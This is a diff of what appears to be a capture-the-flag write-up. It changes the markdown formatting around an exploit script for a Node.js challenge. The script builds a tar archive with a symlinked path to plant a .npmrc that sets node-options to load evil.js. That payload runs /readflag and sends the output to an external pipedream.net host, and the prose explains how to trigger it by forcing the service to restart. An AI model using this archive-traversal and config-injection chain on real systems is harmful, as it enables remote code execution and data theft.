@@ -312,9 +312,10 @@ echo "node-options='--require /home/node/evil.js'" > /home/node/.npmrc
 
 Then, write a `.js` file to `/app/data`, which triggers `nodemon` to restart `node`, thereby causing `evil.js` to be executed. The purpose of `nodemon` is mainly for convenience during the competition. In practice, it is highly unlikely for someone to use `nodemon` to start production services. Nevertheless, we can still write files first and then wait patiently until the service restarts and the command is executed. In a `Docker` container with a configured restart strategy, you can also force a restart by crashing the service.
 
+```bash
+#!/bin/sh
 
 # Generate Tar
-```
 mkdir /home/node
 ln -s /home/node/ n\\x
 tar cf exp.tar n\\x
@@ -322,16 +323,12 @@ echo "node-options='--require /home/node/evil.js'" > n\\x/.npmrc
 echo "const execSync = require('child_process').execSync;const http = require('http');const output = execSync('/readflag', { encoding: 'utf-8' });http.get('http://ent9hso2vt0z.x.pipedream.net/?'+output);" > n\\x/evil.js
 echo "dummy" > test.js
 tar rf exp.tar n\\x n\\x/.npmrc n\\x/evil.js test.js
-```
 
 # Compress
-```
 gzip -9 < exp.tar > exp.tar.gz
 mv exp.tar.gz exp.tar
-```
 
 # Clean Up
-```
 rm n\\x/.npmrc n\\x/evil.js test.js n\\x
 rm -r /home/node
 ```
